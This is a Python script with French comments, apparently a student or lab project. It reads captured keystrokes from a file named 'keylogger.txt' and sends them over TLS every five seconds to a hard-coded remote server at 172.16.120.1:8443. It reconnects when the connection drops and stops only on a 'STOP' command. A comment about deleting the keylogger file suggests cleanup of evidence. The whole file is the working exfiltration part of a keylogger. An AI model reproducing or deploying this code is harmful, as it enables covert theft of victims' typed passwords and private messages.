import socket
import ssl
import time

def read_data_from_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data


def create_ssl_conn(socket, host, port):
    # création du contexte ssl (avec le certificat du serveur)
    context_ssl = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context_ssl.load_verify_locations(cafile="./ssl2/certificate.pem")


    # Connexion au serveur (avec implémentation du chiffrement)
    conn_ssl = context_ssl.wrap_socket(socket, server_hostname='localhost')

    try:
        conn_ssl.connect((host, port))

    except Exception as e:
        print("Erreur lors de la connexion")
        return "error"

    return conn_ssl


host = '172.16.120.1'
port = 8443 

file_path = 'keylogger.txt'  

# Lire les données du fichier
keyboard_data = read_data_from_file(file_path)


# création du socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.settimeout(3.0)

conn = create_ssl_conn(client_socket, host, port)

running = True

t1 = time.time()


while running:
    try:
        t2 = time.time()

        if t2 - t1 > 5:
            # update de t1
            t1 = t2

            # envoyer les données au serveur
            conn.send(keyboard_data.encode('utf-8'))

            code = conn.recv(1024).decode("utf-8")
            print("code : " + code)

            if code == "STOP":
                running = False



    except ssl.SSLEOFError:

        retries = 0
        disconnected = True

        t1 = time.time()

        while disconnected:
            t2 = time.time()

            if t2 - t1 > 10:
                conn = create_ssl_conn(client_socket, host, port)
                
                if conn == "error":
                    retries = retries + 1

                else:
                    disconnected = False
            
            if retries > 10:
                print("Le serveur est injoingnable !")

    except Exception as e:
        print(type(e))
        


# fin de la connexion

# supprimer le fichier keylogger

conn.close()
client_socket.close()
